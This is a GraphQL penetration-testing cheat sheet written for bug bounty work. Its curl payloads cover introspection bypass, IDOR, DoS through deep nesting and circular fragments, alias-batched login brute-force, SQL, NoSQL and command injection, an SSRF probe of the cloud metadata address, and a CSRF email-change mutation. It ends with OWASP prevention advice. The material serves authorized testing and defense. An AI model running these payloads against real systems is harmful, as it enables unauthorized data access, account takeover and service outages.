# GraphQL Security Testing

> Comprehensive GraphQL security testing for bug bounty hunters and penetration testers. Covers endpoint discovery, introspection, batching attacks, DoS, injection, and authorization bypass techniques (2025‑2026 trends).

## Methodology Overview

GraphQL allows clients to request exactly the data they need, but flexible queries expose risks like schema leaks, DoS via complexity, over‑fetching sensitive fields, and broken authorization. Test these areas:

1. **Endpoint Discovery**: Find GraphQL endpoints (often `/graphql`, `/api/graphql`, `/graphiql`, `/playground`)
2. **Introspection Abuse**: Extract full schema if enabled; bypass defenses if disabled
3. **DoS / Resource Exhaustion**: Deep nesting, circular fragments, massive batching
4. **Injection**: Unsanitized arguments → SQL/NoSQL/OS command/SSRF
5. **Broken Authorization**: BOLA/IDOR, excessive data exposure (over‑privileged fields)
6. **Brute‑force / Replay**: Alias batching for login/OTP brute‑force
7. **CSRF over GraphQL**: If no anti‑CSRF token in mutations

## Endpoint Discovery

### Universal Query Probe

```bash
# Works on any GraphQL endpoint - returns {"data": {"__typename": "query"}}
curl -X POST "https://target.com/graphql" -H "Content-Type: application/json" -d '{"query":"{__typename}"}' 2>/dev/null | grep -i __typename
```

### Fuzzing Common Endpoints

```bash
# FFUF fuzzing for GraphQL endpoints
ffuf -u https://target.com/FUZZ -w <(echo -e "graphql\ngraphiql\nplayground\nconsole\nquery\ngql\nv1/graphql\nv2/graphql\napi/graphql\napi/gql\nbatch\naltair") -mc 200,400 -ac -c -H "Content-Type: application/json" -d '{"query":"{__typename}"}' -X POST -o graphql-endpoints.json

# Using httpx for bulk scanning
cat domains.txt | httpx -silent -threads 100 -path /graphql -mc 200,301,302,307,308,400 -x POST -H "Content-Type: application/json" -body '{"query":"{__schema{types{name}}}"}' | grep -i "__schema" | anew graphql-endpoints.txt
```

### Alternative Request Methods

```bash
# GET request (if POST blocked)
curl "https://target.com/graphql?query=query%7B__typename%7D"

# POST with x-www-form-urlencoded
curl -X POST "https://target.com/graphql" -H "Content-Type: application/x-www-form-urlencoded" -d 'query={__typename}'
```

## Introspection & Schema Discovery

### Basic Introspection Queries

```bash
# Check if introspection enabled
curl -X POST "https://target.com/graphql" -H "Content-Type: application/json" -d '{"query":"{__schema{queryType{name}}}"}'

# Get types and fields
curl -X POST "https://target.com/graphql" -H "Content-Type: application/json" -d '{"query":"{__schema{types{name fields{name}}}}"}'

# Full schema dump (save to file)
curl -X POST "https://target.com/graphql" -H "Content-Type: application/json" -d @introspection-query.json -o schema.json
```

### Introspection Bypass Techniques

```bash
# Add special characters after __schema (bypass regex filters)
curl -X POST "https://target.com/graphql" -H "Content-Type: application/json" -d '{"query":"query{__schema\n{queryType{name}}}"}'

# Alternative content-type
curl -X POST "https://target.com/graphql" -H "Content-Type: application/x-www-form-urlencoded" -d 'query=query{__schema{queryType{name}}}'

# Error guessing when introspection disabled (Clairvoyance)
python3 clairvoyance.py -o recovered-schema.json https://target.com/graphql
```

### Schema Visualization

```bash
# Use GraphQL Voyager with dumped schema
python3 -m http.server 8000 &
# Open http://localhost:8000/voyager.html with schema.json
```

## Vulnerability Testing

### IDOR / BOLA Testing

```bash
# Query for other users' data
curl -X POST "https://target.com/graphql" -H "Content-Type: application/json" -d '{"query":"{user(id:\"victim-uuid\") {email privateData}}"}'

# Batch query for multiple IDs (alias attack)
curl -X POST "https://target.com/graphql" -H "Content-Type: application/json" -d '{"query":"{user1:user(id:\"1\"){email} user2:user(id:\"2\"){email} user3:user(id:\"3\"){email}}"}'
```

### DoS via Deep Nesting

```bash
# Create deeply nested query (adjust depth)
python3 -c "
depth = 50
query = '{user { ' + 'friends { ' * depth + 'id' + ' }' * depth + ' } }'
print(query)
" | xargs -I@ curl -X POST "https://target.com/graphql" -H "Content-Type: application/json" -d '{"query":"@"}'
```

### Circular Fragment DoS

```bash
curl -X POST "https://target.com/graphql" -H "Content-Type: application/json" -d '{"query":"fragment F on User { friends { ...F } } { user { ...F } }"}'
```

### Batch Brute-force (Login/OTP)

```bash
# Batch login attempts (bypasses per‑request rate limits)
curl -X POST "https://target.com/graphql" -H "Content-Type: application/json" -d '{"query":"mutation { a1:login(email:\"admin\", pass:\"a\") a2:login(email:\"admin\", pass:\"b\") a3:login(email:\"admin\", pass:\"c\") }"}'
```

### Injection Testing

```bash
# SQL Injection in arguments
curl -X POST "https://target.com/graphql" -H "Content-Type: application/json" -d '{"query":"{search(query:\"test\\' OR 1=1--\") {results}}"}'

# NoSQL Injection
curl -X POST "https://target.com/graphql" -H "Content-Type: application/json" -d '{"query":"{user(filter:\"{\\\\\"$where\\\\\":\\\\\"1==1\\\\\"}\") {email}}"}'

# Command Injection
curl -X POST "https://target.com/graphql" -H "Content-Type: application/json" -d '{"query":"{system(cmd:\"id;whoami\") {output}}"}'

# SSRF via URL parameters
curl -X POST "https://target.com/graphql" -H "Content-Type: application/json" -d '{"query":"{fetchUrl(url:\"http://169.254.169.254/metadata\") {content}}"}'
```

### CSRF Testing

```bash
# Check if mutations accept GET requests (CSRF vulnerable)
curl "https://target.com/graphql?query=mutation%20%7BdeleteAccount%28id%3A%22123%22%29%7Bstatus%7D%7D"

# Test with origin/referer headers missing
curl -X POST "https://target.com/graphql" -H "Content-Type: application/json" -d '{"query":"mutation { updateEmail(newEmail:\"attacker@evil.com\") { status } }"}' -H "Origin: null"
```

## Tool Automation

### InQL (Burp Suite Extension)

```bash
# Generate queries from schema
java -jar inql.jar -t https://target.com/graphql -o queries/

# Scanner mode
java -jar inql.jar -t https://target.com/graphql --scan
```

### GraphQL Cop

```bash
# Security scanning
graphql-cop -t https://target.com/graphql -o report.html

# Batch/alias detection
graphql-cop --check-batching https://target.com/graphql
```

### Custom Scripts

```bash
# Enumerate all mutations and test for auth bypass
python3 enumerate_mutations.py schema.json | while read mutation; do
  curl -X POST "https://target.com/graphql" -H "Content-Type: application/json" -d "{\"query\":\"$mutation\"}" | grep -v "Not authorized" | tee -a results.txt
done
```

## Prevention & Best Practices

From OWASP GraphQL Cheat Sheet:
1. **Disable introspection** in production (`introspection: false`)
2. **Implement depth limiting** (e.g., graphql-depth-limit)
3. **Query complexity / cost analysis** (graphql-cost-analysis, reject high-cost)
4. **Field‑level authorization** — enforce per‑field checks
5. **Rate limiting per user / IP** + batch/alias limits
6. **Input validation / sanitization** on all args
7. **Disable batching** or strict limits on production
8. **Use persisted queries** (whitelist allowed operations)
9. **Only accept JSON‑encoded POST** with proper Content‑Type validation
10. **Implement CSRF tokens** for mutations

## References

- **OWASP GraphQL Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
- **PortSwigger GraphQL API vulnerabilities**: https://portswigger.net/web-security/graphql
- **PayloadsAllTheThings – GraphQL Injection**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection
- **GitHub Security Lab – GraphQL Security**: https://securitylab.github.com/research/graphql
- **GraphQL Foundation Security WG**: https://github.com/graphql/graphql-wg/tree/main/agendas
- **2025‑2026 Trends**: Introspection bypass via error guessing, alias brute‑force, persistent batching DoS, field‑level auth bypass


